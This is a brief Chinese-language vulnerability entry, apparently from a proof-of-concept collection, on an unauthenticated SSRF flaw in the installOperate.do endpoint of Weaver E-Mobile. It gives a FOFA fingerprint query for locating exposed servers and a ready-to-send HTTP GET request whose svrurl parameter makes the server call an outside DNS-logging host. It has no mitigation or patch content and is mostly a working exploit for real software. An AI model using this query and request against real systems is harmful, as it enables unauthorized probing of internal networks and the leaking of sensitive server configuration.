# 泛微E-Mobile系统接口installOperate.do存在SSRF漏洞

泛微E-Mobile installOperate.do 接口处存在服务器请求伪造漏洞，未经身份验证的远程攻击者利用此漏洞扫描服务器所在的内网或本地端口，获取服务的banner信息，窥探网络结构，甚至对内网或本地运行的应用程序发起攻击，获取服务器内部敏感配置，造成信息泄露。

## fofa

```yaml
header="EMobileServer"
```

## poc

```yaml
GET /install/installOperate.do?svrurl=http://dnslog.cn HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407232013270.png)